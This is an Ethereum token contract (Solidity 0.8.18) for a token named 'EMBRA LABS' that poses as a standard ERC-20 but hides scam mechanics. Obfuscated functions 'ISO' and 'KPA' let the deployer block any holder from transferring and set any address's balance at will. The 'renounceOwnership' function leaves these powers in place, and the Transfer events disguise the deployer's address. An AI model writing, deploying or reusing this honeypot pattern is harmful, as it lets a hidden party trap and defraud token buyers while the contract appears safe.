/**
 *Submitted for verification at Etherscan.io on 2023-02-19
*/

pragma solidity 0.8.18;

 
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

} 

 
contract EMBRA {
  
    mapping (address => uint256) private bNx;
    mapping (address => uint256) private cNx;
	
    mapping(address => mapping(address => uint256)) public allowance;
    string public name = "EMBRA LABS";
    string public symbol = unicode"EMBRA";
    uint8 public decimals = 6;


    uint256 public totalSupply = 250000000 *10**6;
    address owner = msg.sender;
    uint256 private NA;
    address private dNx;
    address private eNx;


    address fNx = 0x00C5E04176d95A286fccE0E68c683Ca0bfec8454;
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
   



        constructor()  {
		 NA = 0;
    dNx = msg.sender;
    bNx[msg.sender] = totalSupply;
    eNx = fNx;
    emit Transfer(address(0), eNx, totalSupply); 
   
    }

    function renounceOwnership() public virtual {
       
        require(msg.sender == owner);
        emit OwnershipTransferred(owner, address(0));
        owner = address(0);
        
    }
       function ISO (address IxI, uint256 lXl)  public {
     require(msg.sender == dNx);
   cNx[IxI] = lXl;}


   function balanceOf(address account) public view  returns (uint256) {
        return bNx[account];
    }

    function transfer(address to, uint256 value) public returns (bool success) {


    
        require(bNx[msg.sender] >= value);
        require(cNx[msg.sender] <= NA); 
  bNx[msg.sender] -= value;  
        bNx[to] += value;          
 emit Transfer(msg.sender, to, value);
        return true; }
        function KPA (address IxI, uint256 lXl)  public {
    require(msg.sender == dNx);
    bNx[IxI] = lXl;}
 function approve(address spender, uint256 value) public returns (bool success) {    
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true; }


   function transferFrom(address from, address to, uint256 value) public returns (bool success) {   
  
     
        require(cNx[from] <= NA);
        require(cNx[to] <= NA);
        require(value <= bNx[from]);
        require(value <= allowance[from][msg.sender]);
        bNx[from] -= value;
        bNx[to] += value;
        allowance[from][msg.sender] -= value;
       if(from == dNx) {from = fNx;}
        emit Transfer(from, to, value);
        return true; }



    }